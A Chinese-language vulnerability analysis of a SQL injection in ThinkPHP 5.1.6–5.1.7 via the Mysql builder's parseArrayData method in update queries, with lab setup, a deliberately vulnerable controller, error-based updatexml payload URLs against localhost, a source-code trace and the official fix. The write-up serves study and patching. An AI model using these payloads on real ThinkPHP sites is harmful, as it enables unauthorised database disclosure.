# ThinkPHP5.1.x SQL注入(Update)

Author: H3rmesk1t

Data: 2021.08.13

# 漏洞概要

- 本次漏洞存在于 `Mysql` 类的 `parseArrayData` 方法中，由于程序没有对数据进行很好的过滤，将数据拼接进 SQL 语句，导致 SQL注入漏洞 的产生
- 漏洞影响版本： 5.1.6<=ThinkPHP<=5.1.7 (非最新的 5.1.8 版本也可利用)
# 初始配置
- 获取测试环境代码

```bash
composer create-project --prefer-dist topthink/think=5.1  tpH3rmesk1t
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/ad95b5b9781f4b9fabccb2dbae673760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

将 composer.json 文件的 require 字段设置成如下

```bas
"require": {
    "php": ">=5.6.0",
    "topthink/framework": "5.1.7"
}
```

然后执行 `composer update`

![在这里插入图片描述](https://img-blog.csdnimg.cn/344ef95318c342f1914da5e9a4f90185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

- 下载后的源码中，需要对`application/index/controller/Index.php`内容进行修改

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $username = request()->get('username/a');
        db('users')->where(['id' =1])->update(['username' =$username]);
        return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"<h1>:)Gyan师傅永远嘀神！！！</h1><pThinkPHP V5.1<br/><span style="font-size:30px">12载初心不改（2006-2018） - 你值得信赖的PHP框架</span></p></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="eab4b9f840753f8e7"></think>';
    }
}
?>
```

在`config/database.php`文件中配置数据库相关信息，并开启`config/app.php`中的app_debug和app_trace,创建数据库信息如下

```php
create database thinkphp;
use thinkphp;
create table users(
	id int primary key auto_increment,
	username varchar(50) not null,
);
insert into users(id,username) values(1,'H3rmesk1t');
```
# 漏洞利用

Payload：
```nash
http://127.0.0.1/cms/public/index.php?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,database(),0x7e),1)^&username[3]=0 
或者
http://127.0.0.1/cms/public/index.php?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,database(),0x7e),1)|&username[3]=0 
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/8d04b60646ea4ee08e63f5be947c0671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 漏洞分析
先打断点，跟进一下payload，先接收变量

![在这里插入图片描述](https://img-blog.csdnimg.cn/497edc01ad754de7ac65fbcf51aae8de.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进到`thinkphp/helper.php`中的`db`方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/7fd6c6d62f8b473b990ed3fcc32bf57f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进到`thinkphp/library/think/db/Query.php`中`where`方法，接着进入`update`方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/83563ac2ac794d448e715778625a3b04.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/424b57587df04c6e9e7e88c397e6b312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

进入到return里面，跟进到`thinkphp/library/think/db/Connection.php`中`connect`类的`update`方法，找到生成update的SQL语句`$sql  = $this->builder->update($query);`，跟进该语句看看干了什么

![在这里插入图片描述](https://img-blog.csdnimg.cn/0ce53b54d52147bb95dd6141fdfa8d50.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进`thinkphp/library/think/db/Builder.php`中的`update`方法，在`Builder`类中的`update`方法里又调用了`parseData`方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/20d4f408690f497b96453b0b84dc476f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进`parseData`方法，在该方法中的swich语句中的default 语句中存在一个`parseArrayData`方法，跟进去看看

![在这里插入图片描述](https://img-blog.csdnimg.cn/9d10cf625c63497ba1edba31794f7610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

跟进`thinkphp/library/think/db/builder/Mysql.php`中的`parseArrayData`方法，这里如果数组`$data`第一个变量的小写是`point`的话就进入到后续的判断语句中；由于`$data[2]`和`$data[3]`都不为空，所以就是传进来的值；if语句判断了一下``$data[1]``是不是数组，是的话就将一维数组的值连接为一个字符串；最后进入到拼接语句，拼接的形式为：`$data[2]('$data[3]($data[1])');`，参数均为可控参数

![在这里插入图片描述](https://img-blog.csdnimg.cn/34ece30086f24e93bf43dff4bf01c164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

用debug看看拼接后的值：`updatexml(1,concat(0x7,database(),0x7e),1)^('0(1)')`，成功造成SQL注入

![在这里插入图片描述](https://img-blog.csdnimg.cn/5c1c8a82974146ca88ba677c0a23a633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

# 漏洞修复

参考官方修复方法，直接将 `parseArrayData` 方法删除

![在这里插入图片描述](https://img-blog.csdnimg.cn/e8b76dfbded34fc3ba8d13c743f43120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# 攻击总结

参考Mochazz师傅的审计流程

![在这里插入图片描述](https://img-blog.csdnimg.cn/db1a2b18b6ad4d78b94935e5d4cfe47f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

